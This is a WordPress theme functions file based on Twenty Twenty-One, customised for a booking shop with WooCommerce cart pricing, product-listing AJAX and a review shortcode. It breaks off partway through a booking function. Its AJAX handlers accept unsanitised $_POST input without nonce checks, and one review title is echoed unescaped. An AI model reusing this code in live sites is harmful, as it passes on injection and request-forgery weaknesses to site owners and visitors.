<?php

/**
 * Functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package WordPress
 * @subpackage Twenty_Twenty_One
 * @since Twenty Twenty-One 1.0
 */

// This theme requires WordPress 5.3 or later.
if (version_compare($GLOBALS['wp_version'], '5.3', '<')) {
    require get_template_directory() . '/inc/back-compat.php';
}


if (!function_exists('twenty_twenty_one_setup')) {
    /**
     * Sets up theme defaults and registers support for various WordPress features.
     *
     * Note that this function is hooked into the after_setup_theme hook, which
     * runs before the init hook. The init hook is too late for some features, such
     * as indicating support for post thumbnails.
     *
     * @since Twenty Twenty-One 1.0
     *
     * @return void
     */
    function twenty_twenty_one_setup()
    {
        /*
         * Make theme available for translation.
         * Translations can be filed in the /languages/ directory.
         * If you're building a theme based on Twenty Twenty-One, use a find and replace
         * to change 'twentytwentyone' to the name of your theme in all the template files.
         */
        load_theme_textdomain('twentytwentyone', get_template_directory() . '/languages');

        // Add default posts and comments RSS feed links to head.
        add_theme_support('automatic-feed-links');

        /*
         * Let WordPress manage the document title.
         * This theme does not use a hard-coded <title> tag in the document head,
         * WordPress will provide it for us.
         */
        add_theme_support('title-tag');

        /**
         * Add post-formats support.
         */
        add_theme_support(
            'post-formats',
            array(
                'link',
                'aside',
                'gallery',
                'image',
                'quote',
                'status',
                'video',
                'audio',
                'chat',
            )
        );

        /*
         * Enable support for Post Thumbnails on posts and pages.
         *
         * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
         */
        add_theme_support('post-thumbnails');
        set_post_thumbnail_size(1568, 9999);

        register_nav_menus(
            array(
                'primary' => esc_html__('Primary menu', 'twentytwentyone'),
                'footer'  => esc_html__('Secondary menu', 'twentytwentyone'),
            )
        );

        /*
         * Switch default core markup for search form, comment form, and comments
         * to output valid HTML5.
         */
        add_theme_support(
            'html5',
            array(
                'comment-form',
                'comment-list',
                'gallery',
                'caption',
                'style',
                'script',
                'navigation-widgets',
            )
        );

        /*
         * Add support for core custom logo.
         *
         * @link https://codex.wordpress.org/Theme_Logo
         */
        $logo_width  = 300;
        $logo_height = 100;

        add_theme_support(
            'custom-logo',
            array(
                'height'               => $logo_height,
                'width'                => $logo_width,
                'flex-width'           => true,
                'flex-height'          => true,
                'unlink-homepage-logo' => true,
            )
        );

        // Add theme support for selective refresh for widgets.
        add_theme_support('customize-selective-refresh-widgets');

        // Add support for Block Styles.
        add_theme_support('wp-block-styles');

        // Add support for full and wide align images.
        add_theme_support('align-wide');

        // Add support for editor styles.
        add_theme_support('editor-styles');
        $background_color = get_theme_mod('background_color', 'D1E4DD');
        if (127 > Twenty_Twenty_One_Custom_Colors::get_relative_luminance_from_hex($background_color)) {
            add_theme_support('dark-editor-style');
        }

        $editor_stylesheet_path = './assets/css/style-editor.css';

        // Note, the is_IE global variable is defined by WordPress and is used
        // to detect if the current browser is internet explorer.
        global $is_IE;
        if ($is_IE) {
            $editor_stylesheet_path = './assets/css/ie-editor.css';
        }

        // Enqueue editor styles.
        add_editor_style($editor_stylesheet_path);

        // Add custom editor font sizes.
        add_theme_support(
            'editor-font-sizes',
            array(
                array(
                    'name'      => esc_html__('Extra small', 'twentytwentyone'),
                    'shortName' => esc_html_x('XS', 'Font size', 'twentytwentyone'),
                    'size'      => 16,
                    'slug'      => 'extra-small',
                ),
                array(
                    'name'      => esc_html__('Small', 'twentytwentyone'),
                    'shortName' => esc_html_x('S', 'Font size', 'twentytwentyone'),
                    'size'      => 18,
                    'slug'      => 'small',
                ),
                array(
                    'name'      => esc_html__('Normal', 'twentytwentyone'),
                    'shortName' => esc_html_x('M', 'Font size', 'twentytwentyone'),
                    'size'      => 20,
                    'slug'      => 'normal',
                ),
                array(
                    'name'      => esc_html__('Large', 'twentytwentyone'),
                    'shortName' => esc_html_x('L', 'Font size', 'twentytwentyone'),
                    'size'      => 24,
                    'slug'      => 'large',
                ),
                array(
                    'name'      => esc_html__('Extra large', 'twentytwentyone'),
                    'shortName' => esc_html_x('XL', 'Font size', 'twentytwentyone'),
                    'size'      => 40,
                    'slug'      => 'extra-large',
                ),
                array(
                    'name'      => esc_html__('Huge', 'twentytwentyone'),
                    'shortName' => esc_html_x('XXL', 'Font size', 'twentytwentyone'),
                    'size'      => 96,
                    'slug'      => 'huge',
                ),
                array(
                    'name'      => esc_html__('Gigantic', 'twentytwentyone'),
                    'shortName' => esc_html_x('XXXL', 'Font size', 'twentytwentyone'),
                    'size'      => 144,
                    'slug'      => 'gigantic',
                ),
            )
        );

        // Custom background color.
        add_theme_support(
            'custom-background',
            array(
                'default-color' => 'd1e4dd',
            )
        );

        // Editor color palette.
        $black     = '#000000';
        $dark_gray = '#28303D';
        $gray      = '#39414D';
        $green     = '#D1E4DD';
        $blue      = '#D1DFE4';
        $purple    = '#D1D1E4';
        $red       = '#E4D1D1';
        $orange    = '#E4DAD1';
        $yellow    = '#EEEADD';
        $white     = '#FFFFFF';

        add_theme_support(
            'editor-color-palette',
            array(
                array(
                    'name'  => esc_html__('Black', 'twentytwentyone'),
                    'slug'  => 'black',
                    'color' => $black,
                ),
                array(
                    'name'  => esc_html__('Dark gray', 'twentytwentyone'),
                    'slug'  => 'dark-gray',
                    'color' => $dark_gray,
                ),
                array(
                    'name'  => esc_html__('Gray', 'twentytwentyone'),
                    'slug'  => 'gray',
                    'color' => $gray,
                ),
                array(
                    'name'  => esc_html__('Green', 'twentytwentyone'),
                    'slug'  => 'green',
                    'color' => $green,
                ),
                array(
                    'name'  => esc_html__('Blue', 'twentytwentyone'),
                    'slug'  => 'blue',
                    'color' => $blue,
                ),
                array(
                    'name'  => esc_html__('Purple', 'twentytwentyone'),
                    'slug'  => 'purple',
                    'color' => $purple,
                ),
                array(
                    'name'  => esc_html__('Red', 'twentytwentyone'),
                    'slug'  => 'red',
                    'color' => $red,
                ),
                array(
                    'name'  => esc_html__('Orange', 'twentytwentyone'),
                    'slug'  => 'orange',
                    'color' => $orange,
                ),
                array(
                    'name'  => esc_html__('Yellow', 'twentytwentyone'),
                    'slug'  => 'yellow',
                    'color' => $yellow,
                ),
                array(
                    'name'  => esc_html__('White', 'twentytwentyone'),
                    'slug'  => 'white',
                    'color' => $white,
                ),
            )
        );

        add_theme_support(
            'editor-gradient-presets',
            array(
                array(
                    'name'     => esc_html__('Purple to yellow', 'twentytwentyone'),
                    'gradient' => 'linear-gradient(160deg, ' . $purple . ' 0%, ' . $yellow . ' 100%)',
                    'slug'     => 'purple-to-yellow',
                ),
                array(
                    'name'     => esc_html__('Yellow to purple', 'twentytwentyone'),
                    'gradient' => 'linear-gradient(160deg, ' . $yellow . ' 0%, ' . $purple . ' 100%)',
                    'slug'     => 'yellow-to-purple',
                ),
                array(
                    'name'     => esc_html__('Green to yellow', 'twentytwentyone'),
                    'gradient' => 'linear-gradient(160deg, ' . $green . ' 0%, ' . $yellow . ' 100%)',
                    'slug'     => 'green-to-yellow',
                ),
                array(
                    'name'     => esc_html__('Yellow to green', 'twentytwentyone'),
                    'gradient' => 'linear-gradient(160deg, ' . $yellow . ' 0%, ' . $green . ' 100%)',
                    'slug'     => 'yellow-to-green',
                ),
                array(
                    'name'     => esc_html__('Red to yellow', 'twentytwentyone'),
                    'gradient' => 'linear-gradient(160deg, ' . $red . ' 0%, ' . $yellow . ' 100%)',
                    'slug'     => 'red-to-yellow',
                ),
                array(
                    'name'     => esc_html__('Yellow to red', 'twentytwentyone'),
                    'gradient' => 'linear-gradient(160deg, ' . $yellow . ' 0%, ' . $red . ' 100%)',
                    'slug'     => 'yellow-to-red',
                ),
                array(
                    'name'     => esc_html__('Purple to red', 'twentytwentyone'),
                    'gradient' => 'linear-gradient(160deg, ' . $purple . ' 0%, ' . $red . ' 100%)',
                    'slug'     => 'purple-to-red',
                ),
                array(
                    'name'     => esc_html__('Red to purple', 'twentytwentyone'),
                    'gradient' => 'linear-gradient(160deg, ' . $red . ' 0%, ' . $purple . ' 100%)',
                    'slug'     => 'red-to-purple',
                ),
            )
        );

        /*
        * Adds starter content to highlight the theme on fresh sites.
        * This is done conditionally to avoid loading the starter content on every
        * page load, as it is a one-off operation only needed once in the customizer.
        */
        if (is_customize_preview()) {
            require get_template_directory() . '/inc/starter-content.php';
            add_theme_support('starter-content', twenty_twenty_one_get_starter_content());
        }

        // Add support for responsive embedded content.
        add_theme_support('responsive-embeds');

        // Add support for custom line height controls.
        add_theme_support('custom-line-height');

        // Add support for experimental link color control.
        add_theme_support('experimental-link-color');

        // Add support for experimental cover block spacing.
        add_theme_support('custom-spacing');

        // Add support for custom units.
        // This was removed in WordPress 5.6 but is still required to properly support WP 5.5.
        add_theme_support('custom-units');

        // Remove feed icon link from legacy RSS widget.
        add_filter('rss_widget_feed_link', '__return_false');
    }
}
add_action('after_setup_theme', 'twenty_twenty_one_setup');

/**
 * Register widget area.
 *
 * @since Twenty Twenty-One 1.0
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 *
 * @return void
 */
function twenty_twenty_one_widgets_init()
{

    register_sidebar(
        array(
            'name'          => esc_html__('Footer', 'twentytwentyone'),
            'id'            => 'sidebar-1',
            'description'   => esc_html__('Add widgets here to appear in your footer.', 'twentytwentyone'),
            'before_widget' => '<section id="%1$s" class="widget %2$s">',
            'after_widget'  => '</section>',
            'before_title'  => '<h2 class="widget-title">',
            'after_title'   => '</h2>',
        )
    );
}
add_action('widgets_init', 'twenty_twenty_one_widgets_init');

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @since Twenty Twenty-One 1.0
 *
 * @global int $content_width Content width.
 *
 * @return void
 */
function twenty_twenty_one_content_width()
{
    // This variable is intended to be overruled from themes.
    // Open WPCS issue: {@link https://github.com/WordPress-Coding-Standards/WordPress-Coding-Standards/issues/1043}.
    // phpcs:ignore WordPress.NamingConventions.PrefixAllGlobals.NonPrefixedVariableFound
    $GLOBALS['content_width'] = apply_filters('twenty_twenty_one_content_width', 750);
}
add_action('after_setup_theme', 'twenty_twenty_one_content_width', 0);

/**
 * Enqueue scripts and styles.
 *
 * @since Twenty Twenty-One 1.0
 *
 * @return void
 */
function twenty_twenty_one_scripts()
{
    // Note, the is_IE global variable is defined by WordPress and is used
    // to detect if the current browser is internet explorer.
    global $is_IE, $wp_scripts;
    if ($is_IE) {
        // If IE 11 or below, use a flattened stylesheet with static values replacing CSS Variables.
        wp_enqueue_style('twenty-twenty-one-style', get_template_directory_uri() . '/assets/css/ie.css', array(), wp_get_theme()->get('Version'));
    } else {
        // If not IE, use the standard stylesheet.
        wp_enqueue_style('twenty-twenty-one-style', get_template_directory_uri() . '/style.css', array(), wp_get_theme()->get('Version'));
    }

    // RTL styles.
    wp_style_add_data('twenty-twenty-one-style', 'rtl', 'replace');

    // Print styles.
    wp_enqueue_style('twenty-twenty-one-print-style', get_template_directory_uri() . '/assets/css/print.css', array(), wp_get_theme()->get('Version'), 'print');

    // Threaded comment reply styles.
    if (is_singular() && comments_open() && get_option('thread_comments')) {
        wp_enqueue_script('comment-reply');
    }

    // Register the IE11 polyfill file.
    wp_register_script(
        'twenty-twenty-one-ie11-polyfills-asset',
        get_template_directory_uri() . '/assets/js/polyfills.js',
        array(),
        wp_get_theme()->get('Version'),
        true
    );

    // Register the IE11 polyfill loader.
    wp_register_script(
        'twenty-twenty-one-ie11-polyfills',
        null,
        array(),
        wp_get_theme()->get('Version'),
        true
    );
    wp_add_inline_script(
        'twenty-twenty-one-ie11-polyfills',
        wp_get_script_polyfill(
            $wp_scripts,
            array(
                'Element.prototype.matches && Element.prototype.closest && window.NodeList && NodeList.prototype.forEach' => 'twenty-twenty-one-ie11-polyfills-asset',
            )
        )
    );

    // Main navigation scripts.
    if (has_nav_menu('primary')) {
        wp_enqueue_script(
            'twenty-twenty-one-primary-navigation-script',
            get_template_directory_uri() . '/assets/js/primary-navigation.js',
            array('twenty-twenty-one-ie11-polyfills'),
            wp_get_theme()->get('Version'),
            true
        );
    }

    // Responsive embeds script.
    wp_enqueue_script(
        'twenty-twenty-one-responsive-embeds-script',
        get_template_directory_uri() . '/assets/js/responsive-embeds.js',
        array('twenty-twenty-one-ie11-polyfills'),
        wp_get_theme()->get('Version'),
        true
    );
}
add_action('wp_enqueue_scripts', 'twenty_twenty_one_scripts');

/**
 * Enqueue block editor script.
 *
 * @since Twenty Twenty-One 1.0
 *
 * @return void
 */
function twentytwentyone_block_editor_script()
{

    wp_enqueue_script('twentytwentyone-editor', get_theme_file_uri('/assets/js/editor.js'), array('wp-blocks', 'wp-dom'), wp_get_theme()->get('Version'), true);
}

add_action('enqueue_block_editor_assets', 'twentytwentyone_block_editor_script');

/**
 * Fix skip link focus in IE11.
 *
 * This does not enqueue the script because it is tiny and because it is only for IE11,
 * thus it does not warrant having an entire dedicated blocking script being loaded.
 *
 * @since Twenty Twenty-One 1.0
 *
 * @link https://git.io/vWdr2
 */
function twenty_twenty_one_skip_link_focus_fix()
{

    // If SCRIPT_DEBUG is defined and true, print the unminified file.
    if (defined('SCRIPT_DEBUG') && SCRIPT_DEBUG) {
        echo '<script>';
        include get_template_directory() . '/assets/js/skip-link-focus-fix.js';
        echo '</script>';
    } else {
        // The following is minified via `npx terser --compress --mangle -- assets/js/skip-link-focus-fix.js`.
?>
        <script>
            /(trident|msie)/i.test(navigator.userAgent) && document.getElementById && window.addEventListener && window.addEventListener("hashchange", (function() {
                var t, e = location.hash.substring(1);
                /^[A-z0-9_-]+$/.test(e) && (t = document.getElementById(e)) && (/^(?:a|select|input|button|textarea)$/i.test(t.tagName) || (t.tabIndex = -1), t.focus())
            }), !1);
        </script>
    <?php
    }
}
add_action('wp_print_footer_scripts', 'twenty_twenty_one_skip_link_focus_fix');

/**
 * Enqueue non-latin language styles.
 *
 * @since Twenty Twenty-One 1.0
 *
 * @return void
 */
function twenty_twenty_one_non_latin_languages()
{
    $custom_css = twenty_twenty_one_get_non_latin_css('front-end');

    if ($custom_css) {
        wp_add_inline_style('twenty-twenty-one-style', $custom_css);
    }
}
add_action('wp_enqueue_scripts', 'twenty_twenty_one_non_latin_languages');

// SVG Icons class.
require get_template_directory() . '/classes/class-twenty-twenty-one-svg-icons.php';

// Custom color classes.
require get_template_directory() . '/classes/class-twenty-twenty-one-custom-colors.php';
new Twenty_Twenty_One_Custom_Colors();

// Enhance the theme by hooking into WordPress.
require get_template_directory() . '/inc/template-functions.php';

// Menu functions and filters.
require get_template_directory() . '/inc/menu-functions.php';

// Custom template tags for the theme.
require get_template_directory() . '/inc/template-tags.php';

// Customizer additions.
require get_template_directory() . '/classes/class-twenty-twenty-one-customize.php';
new Twenty_Twenty_One_Customize();

// Block Patterns.
require get_template_directory() . '/inc/block-patterns.php';

// Block Styles.
require get_template_directory() . '/inc/block-styles.php';

// Dark Mode.
require_once get_template_directory() . '/classes/class-twenty-twenty-one-dark-mode.php';
new Twenty_Twenty_One_Dark_Mode();

/**
 * Enqueue scripts for the customizer preview.
 *
 * @since Twenty Twenty-One 1.0
 *
 * @return void
 */
function twentytwentyone_customize_preview_init()
{
    wp_enqueue_script(
        'twentytwentyone-customize-helpers',
        get_theme_file_uri('/assets/js/customize-helpers.js'),
        array(),
        wp_get_theme()->get('Version'),
        true
    );

    wp_enqueue_script(
        'twentytwentyone-customize-preview',
        get_theme_file_uri('/assets/js/customize-preview.js'),
        array('customize-preview', 'customize-selective-refresh', 'jquery', 'twentytwentyone-customize-helpers'),
        wp_get_theme()->get('Version'),
        true
    );
}
add_action('customize_preview_init', 'twentytwentyone_customize_preview_init');

/**
 * Enqueue scripts for the customizer.
 *
 * @since Twenty Twenty-One 1.0
 *
 * @return void
 */
function twentytwentyone_customize_controls_enqueue_scripts()
{

    wp_enqueue_script(
        'twentytwentyone-customize-helpers',
        get_theme_file_uri('/assets/js/customize-helpers.js'),
        array(),
        wp_get_theme()->get('Version'),
        true
    );
}
add_action('customize_controls_enqueue_scripts', 'twentytwentyone_customize_controls_enqueue_scripts');

/**
 * Calculate classes for the main <html> element.
 *
 * @since Twenty Twenty-One 1.0
 *
 * @return void
 */
function twentytwentyone_the_html_classes()
{
    /**
     * Filters the classes for the main <html> element.
     *
     * @since Twenty Twenty-One 1.0
     *
     * @param string The list of classes. Default empty string.
     */
    $classes = apply_filters('twentytwentyone_html_classes', '');
    if (!$classes) {
        return;
    }
    echo 'class="' . esc_attr($classes) . '"';
}

/**
 * Add "is-IE" class to body if the user is on Internet Explorer.
 *
 * @since Twenty Twenty-One 1.0
 *
 * @return void
 */
function twentytwentyone_add_ie_class()
{
    ?>
    <script>
        if (-1 !== navigator.userAgent.indexOf('MSIE') || -1 !== navigator.appVersion.indexOf('Trident/')) {
            document.body.classList.add('is-IE');
        }
    </script>
    <?php
}
add_action('wp_footer', 'twentytwentyone_add_ie_class');

if (!function_exists('wp_get_list_item_separator')) :
    /**
     * Retrieves the list item separator based on the locale.
     *
     * Added for backward compatibility to support pre-6.0.0 WordPress versions.
     *
     * @since 6.0.0
     */
    function wp_get_list_item_separator()
    {
        /* translators: Used between list items, there is a space after the comma. */
        return __(', ', 'twentytwentyone');
    }
endif;


if (function_exists('acf_add_options_page')) {
    acf_add_options_page(array(
        'page_title' => 'Theme General Settings',
        'menu_title' => 'Theme Settings',
        'menu_slug'  => 'theme-general-settings',
        'capability' => 'edit_posts',
        'redirect' => false
    ));


    acf_add_options_sub_page(array(
        'page_title' => 'Theme Footer Settings',
        'menu_title' => 'Footer',
        'parent_slug'  => 'theme-general-settings',
    ));
    acf_add_options_sub_page(array(
        'page_title' => 'Theme Header Settings',
        'menu_title' => 'Header',
        'parent_slug' => 'theme-general-settings',
    ));
    acf_add_options_sub_page(array(
        'page_title' => 'Theme Testimonials Settings',
        'menu_title' => 'Testimonials',
        'parent_slug' => 'theme-general-settings',
    ));
    acf_add_options_sub_page(array(
        'page_title' => 'Theme Cart Settings',
        'menu_title' => 'Cart Option',
        'parent_slug' => 'theme-general-settings',
    ));
}




register_nav_menus(array(
    'primary' => __('Primary Menu', 'My_First_WordPress_Theme'),
    'right_menu' => __('Right Menu',       'My_First_WordPress_Theme'),
    'mobile_menu' => __('Mobile Menu', 'My_First_WordPress_Theme'),
    'footer_menu' => __('Footer Menu', 'My_First_WordPress_Theme')
));


function mytheme_add_woocommerce_support()
{
    add_theme_support('woocommerce');
}
add_action('after_setup_theme', 'mytheme_add_woocommerce_support');

function addToCartAction()
{
    if (!empty($_POST['product_id'])) {
        $total_nights = !empty($_POST['booking_type']) ? (($_POST['booking_type'] == 'Luxury' ? '1 Year' : $_POST['total_night'] . ' Nights '))  : '';
        if (!in_array(get_the_ID(), array_column(WC()->cart->get_cart(), 'product_id'))) {
            WC()->cart->add_to_cart($_POST['product_id'], 1, 0, [], [
                'total_adult' => (!empty($_POST['total_adult']) ? " + " . $_POST['total_adult'] . " Adults" : '') . " " . (!empty($_POST['total_kids']) ? " + " . $_POST['total_kids'] . " Kids" : '') . " " . (!empty($_POST['total_infant']) ? " + " . $_POST['total_infant'] . " Infants" : '') . " " . (!empty($_POST['total_date']) ? " + " . $_POST['total_date'] : '') . " + " . $total_nights,
                'date_range' => !empty($_POST['total_date']) ?  $_POST['total_date'] : '',
                'item_price' => $_POST['booking_type'] == 'Luxury' ? 0 : getTotalPriceOfBooking($_POST['checkin'], $_POST['checkout'], $_POST['product_id'])
            ]); // Yes, it is in cart!
        }
        echo json_encode(['code' => 200]);
    }
    wp_die();
}
add_action('wp_ajax_addToCartAction', 'addToCartAction');
add_action('wp_ajax_nopriv_addToCartAction', 'addToCartAction');

function getTotalPriceOfBooking($checkin, $checkout, $post_id)
{
    $total_dates = getDatesRange($checkin, $checkout);
    //return $total_dates;
    $booking_data = get_post_meta($post_id, 'booking_data', true);
    $booking_data = !empty($booking_data) ? json_decode($booking_data, true) : array();
    $available_obj = array_filter($booking_data, function ($var) use ($total_dates) {
        return in_array($var['date'], $total_dates);
    });
    $price = array_column($available_obj, 'price');
    return array_sum($price);
}
function getDatesRange($start_date, $end_date)
{
    $dates = array();

    $current_date = strtotime($start_date);
    $end_timestamp = strtotime($end_date);

    while ($current_date <= $end_timestamp) {
        $dates[] = date('Y-m-d', $current_date);
        $current_date = strtotime('+1 day', $current_date);
    }
    array_pop($dates);
    return $dates;
}

add_action('woocommerce_before_calculate_totals', 'before_calculate_total', 1000, 1);
function before_calculate_total($cart)
{
    foreach ($cart->get_cart() as $k => $cart_item) {
        $cart_item['data']->set_name($cart_item['data']->get_name() . " " . $cart_item['total_adult']);
        if (!empty($cart_item['item_price'])) {
            if ((int)$cart_item['item_price'] > 0) {
                $cart_item['data']->set_price($cart_item['item_price']);
            }
        }
    }
    WC()->cart->set_session();
}

// add_filter('gettext', 'translate_reply');
// add_filter('ngettext', 'translate_reply');

// function translate_reply($translated)
// {
//     $translated = str_ireplace('Quantity', 'Night', $translated);
//     return $translated;
// }



function getCyberRiskBasicPostAjax($first_term_id)
{
    $args = [];
    $args['post_type'] = 'product';
    $args['post_status'] = 'publish';
    if (!empty($first_term_id)) {
        $args['tax_query'] = [
            ['taxonomy' => 'product_cat', 'field' => 'term_id', 'terms' => $first_term_id]

        ];
    }
    $args['posts_per_page'] = -1;
    $args['orderby'] = 'date';
    $args['order'] = 'DESC';
    $loop = new WP_Query($args);
    $posts = $loop->posts;
    return getCyberRiskXLoopListX($posts);

    wp_die();
}

function getCyberRiskXLoopListX($posts)
{
    ob_start();
    if (!empty($posts)) {
        foreach ($posts as $post) {
            $product = wc_get_product($post->ID);
            // print_r($product);exit;
    ?>
            <div class="col-md-6 col-lg-6 col-xl-6">
                <div class="booking__item">
                    <div class="booking__slides">
                        <?php
                        $gallery_ids = $product->get_gallery_image_ids();
                        foreach ($gallery_ids as $key => $value) {
                        ?>
                            <div class="booking__slide-item">
                                <a href="<?= get_permalink($post->ID); ?>" target="_blank">
                                    <img src="<?= wp_get_attachment_url($value); ?>" alt="img">
                                </a>
                            </div>
                        <?php
                        }
                        ?>
                    </div>
                    <div class="booking__details">
                        <a href="<?= get_permalink($post->ID); ?>" target="_blank">
                            <div class="d-flex align-items-center justify-content-between mb-2">
                                <h6 class="booking__name"><?= get_the_title($post->ID); ?></h6>
                                <!-- <p class="booking__rating"><i class="fas fa-star"></i> 4.7</p> -->
                                <p class="booking__rating"><?= get_the_excerpt($post->ID); ?></p>
                            </div>
                            <p><?= date("d M", strtotime(get_field('check_in_date', $post->ID))); ?> - <?= date("d M", strtotime(get_field('checkout_date', $post->ID))); ?></p>

                            <p class="booking__price">$<?= $product->get_price(); ?>/night</p>

                    </div>
                    </a>
                </div>
            </div>

        <?php }
    } else {
        echo "<h4>No Record Founds.</h4>";
    }
    return ob_get_clean();
}





add_action('wp_ajax_getTermWiseProducts', 'getTermWiseProducts');
add_action('wp_ajax_nopriv_getTermWiseProducts', 'getTermWiseProducts');
function getTermWiseProducts()
{
    $args = [];
    $args['post_type'] = 'product';
    $args['post_status'] = 'publish';
    if (!empty($_POST['term_id'])) {
        $args['tax_query'] = [
            ['taxonomy' => 'product_cat', 'field' => 'term_id', 'terms' => $_POST['term_id']]

        ];
    }
    $args['posts_per_page'] = -1;
    $args['orderby'] = 'date';
    $args['order'] = 'DESC';
    $loop = new WP_Query($args);
    $posts = $loop->posts;
    echo json_encode([
        'posts' => getCyberRiskXLoopListX($posts)
    ]);
    wp_die();
}


function getParentCategoryID($product_id)
{
    $product_categories = wp_get_post_terms($product_id, 'product_cat'); // Get the product categories
    if (!empty($product_categories)) {
        $parent_category = $product_categories[0]; // Assuming the product belongs to only one category
        $parent_category_id = $parent_category->term_id;
        $ancestors = get_ancestors($parent_category_id, 'product_cat');
        if (!empty($ancestors)) {
            $parent_category_id = end($ancestors); // Get the ID of the top-level parent category
        }
        return $parent_category_id;
    }
}




function reviewx_load_review_list($atts)
{

    $atts = shortcode_atts(array(
        'product_id'    => '',
        'order_by'      => 'desc',
        'sort_by'       => '',
        'filter'        => 'on',
        'rating'        => '',
        'review_count'  => '',
        'pagination'    => 'on',
        'per_page'      => '',
        'post_type'     => '',
        'post_title'    => '',
    ), $atts);

    global $reviewx_shortcode;
    $reviewx_shortcode['shortcode_type']    = 'review_list';
    $reviewx_shortcode['rx_product_id']     = $atts['product_id'];
    $reviewx_shortcode['rx_filter']         = $atts['filter'];
    $reviewx_shortcode['rx_pagination']     = $atts['pagination'];
    $reviewx_shortcode['rx_per_page']       = $atts['per_page'];
    $reviewx_shortcode['rx_review_count']   = $atts['review_count'];
    $reviewx_shortcode['rx_order']          = $atts['order_by'];
    $reviewx_shortcode['rx_sort_by']        = $atts['sort_by'];
    $reviewx_shortcode['rx_rating']         = $atts['rating'];
    $reviewx_shortcode['rx_post_title']     = $atts['post_title'];

    if (empty($atts['post_type']) && empty($atts['product_id'])) {
        $reviewx_shortcode['rx_post_type']  = 'product';
    } else if (empty($atts['post_type']) && get_post_type($atts['product_id']) == 'product') {
        $reviewx_shortcode['rx_post_type']  = 'product';
    } else if (!empty($atts['post_type']) && $atts['post_type'] == 'product') {
        $reviewx_shortcode['rx_post_type']  = $atts['post_type'];
    } else if (!empty($atts['post_type']) && $atts['post_type'] == get_post_type($atts['product_id'])) {
        $reviewx_shortcode['rx_post_type']  = $atts['post_type'];
    } else if (empty($atts['post_type']) && !empty($atts['product_id'])) {
        $reviewx_shortcode['rx_post_type']  = get_post_type($atts['product_id']);
    } else if (!empty($atts['post_type']) && empty($atts['product_id'])) {
        $reviewx_shortcode['rx_post_type']  = $atts['post_type'];
    }

    $reviewx_shortcode['rx_per_page'] = -1;

    // if ($reviewx_shortcode['rx_post_type'] == 'product') {
    //     $settings        = \ReviewX\Controllers\Admin\Core\ReviewxMetaBox::get_option_settings();
    //     $template_style  = $settings->template_style;
    //     if (empty($atts['per_page'])) {
    //         $reviewx_shortcode['rx_per_page']       = $settings->review_per_page;
    //     }
    // } else if (\ReviewX_Helper::check_post_type_availability($reviewx_shortcode['rx_post_type']) == TRUE) {
    //     $reviewx_id       = \ReviewX_Helper::get_reviewx_post_type_id($reviewx_shortcode['rx_post_type']);
    //     $settings         = \ReviewX\Controllers\Admin\Core\ReviewxMetaBox::get_metabox_settings($reviewx_id);
    //     $template_style   = $settings->template_style;
    //     if (empty($atts['per_page'])) {
    //         $reviewx_shortcode['rx_per_page']       = $settings->review_per_page;
    //     }
    // }

    $args = \ReviewX_Helper::reviewx_shortcode_query_args($reviewx_shortcode);

    ob_start();
    if (!class_exists('ReviewXPro')) {

        $rx_elementor_controller    = apply_filters('rx_load_elementor_style_controller', '');
        $rx_elementor_template      = isset($rx_elementor_controller['rx_template_type']) ? $rx_elementor_controller['rx_template_type'] : null;

        $rx_oxygen_controller  = apply_filters('rx_load_oxygen_style_controller', '');
        $rx_oxygen_template    = isset($rx_oxygen_controller['rx_template_type']) ? $rx_oxygen_controller['rx_template_type'] : null;

        //Check elementor template
        $args['status'] = 'approve';

        $comments           = get_comments($args);
        //echo count($comments);

        foreach ($comments as $comment) {
            $comment_gallery_meta       = get_comment_meta($comment->comment_ID, 'reviewx_attachments', true);
            $get_rating                 = get_comment_meta($comment->comment_ID, 'rating', true);
            $verified_wc_review         = \ReviewX_Helper::wc_review_is_from_verified_owner($comment->comment_ID, $comment->comment_post_ID);
            $get_review_title           = get_comment_meta($comment->comment_ID, 'reviewx_title', true);
            $allow_customer_location = get_option('_rx_option_allow_location');
            $country_code            = get_comment_meta($comment->comment_ID, 'reviewx_location', true);
            $country_flag             = \ReviewX_Helper::country_flag($country_code);
            $reviewer_censored_name    = get_option('_rx_option_allow_reviewer_name_censor');

        ?>
            <div>
                <div class="testimonial-block">
                    <div class="inner-box">
                        <div class="data_light">
                            <?php
                            if (!empty($get_review_title)) {
                            ?>
                                <h4 class="review_title"><?php echo html_entity_decode($get_review_title); ?></h4>
                            <?php
                            }
                            ?>
                            <i class="fa fa-calendar"> <span> <?php echo date_i18n(get_option('date_format'), strtotime($comment->comment_date)); ?></span></i>
                            <div class="star_data"><?php echo reviewx_show_star_rating($get_rating); ?> </div>
                            <!-- <ul class="star_data">
                                    <li><i class="fa fa-star"></i></li>
                                    <li><i class="fa fa-star"></i></li>
                                    <li><i class="fa fa-star"></i></li>
                                    <li><i class="fa fa-star"></i></li>
                                    <li><i class="fa fa-star"></i></li>
                                </ul> -->
                        </div>
                        <div class="text"><?php comment_text($comment); ?></div>
                        <br>
                        <div class="info-box">
                            <div class="thumb"><?php
                                                //Retrive comment author gravatar                     
                                                echo get_avatar($comment, apply_filters('woocommerce_review_gravatar_size', '70'), '');
                                                ?> </div>
                            <h4 class="name"><?php
                                                if ($reviewer_censored_name == 1) {
                                                    echo esc_html(substr($comment->comment_author, 0, 1) . preg_replace('/[^@]/', '*', substr($comment->comment_author, 1)));
                                                } else {
                                                    echo esc_html($comment->comment_author);
                                                } ?></h4>

                        </div>
                    </div>
                </div>
            </div>
    <?php
        }



        //include REVIEWX_PARTIALS_PATH . 'storefront/shortcode/templates/style-two.php';


    } else {
        apply_filters('rx_load_shortcode_review_templates', $reviewx_shortcode, $args);
    }

    $content = ob_get_clean();
    return $content;
}




add_shortcode('rvx-review-listx', 'reviewx_load_review_list');

// developing some hooks
require_once __DIR__ . "/hooks/single-product.php";
require_once __DIR__ . "/inc/common.php";

// update after payment success
function update_product_metadata_after_payment($order_id)
{
    $order = wc_get_order($order_id);
    foreach ($order->get_items() as $item_id => $item) {
        $product_id = $item->get_product_id();
        getBookingD($product_id); // insert record 
    }
}
add_action('woocommerce_checkout_update_order_meta', 'update_product_metadata_after_payment', 10, 1);

function getBookingD($product_id)
{
    global $wpdb;
    foreach (WC()->cart->get_cart() as $cart_item) {
        if ($cart_item['product_id'] == $product_id) {
            $cart_items[] = $cart_item;
        }
    }
